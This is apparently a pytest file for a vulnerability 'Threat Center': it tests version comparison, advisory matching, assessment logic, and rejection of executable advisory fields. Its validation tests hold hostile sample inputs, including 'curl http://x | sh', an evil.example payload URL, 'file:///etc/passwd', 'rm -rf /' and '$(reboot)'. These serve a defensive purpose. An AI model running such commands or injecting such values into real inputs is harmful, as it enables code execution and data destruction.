"""Threat Center pure logic: version comparison, matching, assessment, and what advisory content may hold."""

from __future__ import annotations

import uuid
from datetime import UTC, datetime

import pytest
from pydantic import ValidationError

from app.models.enums import Assessment, CheckOutcome, MatchBasis, MatchStatus
from app.threats.content import AdvisoryContent
from app.threats.matching import ProductObservation, match
from app.threats.service import assess
from app.threats.versions import UnparseableVersion, Version, in_range


@pytest.mark.parametrize(("a", "b"), [
    ("1.0", "1.0.0"), ("v2.4.1", "2.4.1"), ("10.2.9", "10.2.9"),
])
def test_versions_equal(a, b):
    assert Version.parse(a) == Version.parse(b)


@pytest.mark.parametrize(("lower", "higher"), [
    ("1.9", "1.10"), ("1.0rc1", "1.0"), ("1.0a", "1.0.1"), ("2.4.58", "2.4.58-1ubuntu"), ("9.9.9", "10.0"),
    ("10.2.8-h3", "10.2.9"),
])
def test_versions_order(lower, higher):
    assert Version.parse(lower) < Version.parse(higher)


@pytest.mark.parametrize("bad", ["", None, "latest", "unknown", "-1"])
def test_unparseable_versions_are_refused_not_guessed(bad):
    with pytest.raises(UnparseableVersion):
        Version.parse(bad)


def test_range_semantics():
    v = Version.parse("1.24.0")
    assert in_range(v, introduced="1.20.0", fixed="1.25.0", last_affected=None)
    assert not in_range(v, introduced="1.20.0", fixed="1.24.0", last_affected=None)  # fixed is exclusive
    assert in_range(v, introduced=None, fixed=None, last_affected="1.24.0")  # last_affected is inclusive
    assert not in_range(v, introduced="1.25", fixed=None, last_affected=None)


def _content(**kw):
    base = {"title": "Test advisory", "severity": "critical", "cves": ["CVE-2099-0001"],
            "affected": [{"product": "nginx", "match_names": ["nginx"], "versions": [
                {"introduced": "1.20.0", "fixed": "1.25.0"}]}]}
    base.update(kw)
    return AdvisoryContent.model_validate(base)


def _obs(name, version, third_party=False):
    return ProductObservation(uuid.uuid4(), uuid.uuid4(), name, version, "technology", datetime.now(UTC),
                              third_party=third_party)


def test_matching_is_explicit_about_versions():
    c = _content()
    inside, outside, missing, garbage, other = (_obs("Nginx", "1.24.0"), _obs("nginx", "1.26.1"),
                                                _obs("nginx", None), _obs("nginx", "stable"), _obs("apache", "2.4"))
    verdicts = match(c, [inside, outside, missing, garbage, other])
    assert verdicts[inside.asset_id].status == MatchStatus.POTENTIALLY_AFFECTED
    assert "inside the affected range" in verdicts[inside.asset_id].evidence[0]["reason"]
    assert verdicts[outside.asset_id].status == MatchStatus.NOT_AFFECTED_VERSION
    assert verdicts[missing.asset_id].status == MatchStatus.VERSION_UNKNOWN
    assert verdicts[garbage.asset_id].status == MatchStatus.VERSION_UNKNOWN
    assert other.asset_id not in verdicts


def test_no_ranges_means_every_version_even_unknown():
    c = _content(affected=[{"product": "Example VPN", "match_names": ["example vpn"], "versions": []}])
    o = _obs("Example_VPN", None)
    assert match(c, [o])[o.asset_id].status == MatchStatus.POTENTIALLY_AFFECTED


def test_strongest_verdict_wins_per_asset():
    c = _content()
    asset = uuid.uuid4()
    obs = [ProductObservation(asset, uuid.uuid4(), "nginx", "1.26.0", "service", None),
           ProductObservation(asset, uuid.uuid4(), "nginx", "1.24.0", "technology", None)]
    v = match(c, obs)[asset]
    assert v.status == MatchStatus.POTENTIALLY_AFFECTED and len(v.evidence) == 2


def test_third_party_only_evidence_is_flagged():
    c = _content()
    o = _obs("nginx", "1.24.0", third_party=True)
    assert match(c, [o])[o.asset_id].third_party_only


@pytest.mark.parametrize(("status", "basis", "check", "verified", "expected"), [
    # A product/version match alone is never confirmed.
    (MatchStatus.POTENTIALLY_AFFECTED, MatchBasis.PRODUCT, CheckOutcome.NONE, False, Assessment.POTENTIALLY_AFFECTED),
    # A third-party (e.g. exposure intelligence) report stays unverified.
    (MatchStatus.POTENTIALLY_AFFECTED, MatchBasis.THIRD_PARTY, CheckOutcome.NONE, False,
     Assessment.REPORTED_UNVERIFIED),
    # Only a verified finding (or a check detection) confirms.
    (MatchStatus.POTENTIALLY_AFFECTED, MatchBasis.THIRD_PARTY, CheckOutcome.NONE, True, Assessment.CONFIRMED),
    (MatchStatus.VERSION_UNKNOWN, MatchBasis.PRODUCT, CheckOutcome.DETECTED, False, Assessment.CONFIRMED),
    # A failed/blocked/timed-out check is inconclusive, never "not detected".
    (MatchStatus.POTENTIALLY_AFFECTED, MatchBasis.PRODUCT, CheckOutcome.INCONCLUSIVE, False, Assessment.INCONCLUSIVE),
    (MatchStatus.POTENTIALLY_AFFECTED, MatchBasis.PRODUCT, CheckOutcome.NOT_DETECTED, False, Assessment.NOT_DETECTED),
    (MatchStatus.POTENTIALLY_AFFECTED, MatchBasis.PRODUCT, CheckOutcome.PENDING, False, Assessment.CHECK_PENDING),
    (MatchStatus.NOT_AFFECTED_VERSION, MatchBasis.PRODUCT, CheckOutcome.NOT_DETECTED, False,
     Assessment.NOT_AFFECTED_VERSION),
    (MatchStatus.NO_LONGER_OBSERVED, MatchBasis.PRODUCT, CheckOutcome.NONE, False, Assessment.NO_LONGER_OBSERVED),
])
def test_assessment_order(status, basis, check, verified, expected):
    assert assess(status, basis, check, verified) == expected


# ------------------------------------------------------------ content is data only
@pytest.mark.parametrize("extra", [
    {"command": "curl http://x | sh"},
    {"template": "id: x\nrequests: []"},
    {"download_url": "https://evil.example/payload"},
    {"script": "import os"},
])
def test_advisory_content_refuses_executable_fields(extra):
    with pytest.raises(ValidationError):
        _content(**extra)


@pytest.mark.parametrize("ref", ["javascript:alert(1)", "file:///etc/passwd", "ftp://x/y",
                                 "https://user:pw@example.com/advisory", "not a url"])
def test_references_must_be_plain_http_links(ref):
    with pytest.raises(ValidationError):
        _content(references=[ref])


@pytest.mark.parametrize("key", ["../etc", "Robot; rm -rf /", "a", "UPPER"])
def test_check_keys_are_identifiers_only(key):
    with pytest.raises(ValidationError):
        _content(check_keys=[key])


def test_product_names_are_normalized_and_restricted():
    c = _content(affected=[{"product": "X", "match_names": ["  Apache_HTTP   Server "], "versions": []}])
    assert c.affected[0].match_names == ["apache http server"]
    with pytest.raises(ValidationError):
        _content(affected=[{"product": "X", "match_names": ["$(reboot)"], "versions": []}])


def test_ranges_need_parseable_bounds():
    with pytest.raises(ValidationError):
        _content(affected=[{"product": "X", "match_names": ["x"], "versions": [{"fixed": "latest"}]}])
    with pytest.raises(ValidationError):
        _content(affected=[{"product": "X", "match_names": ["x"], "versions": [{}]}])
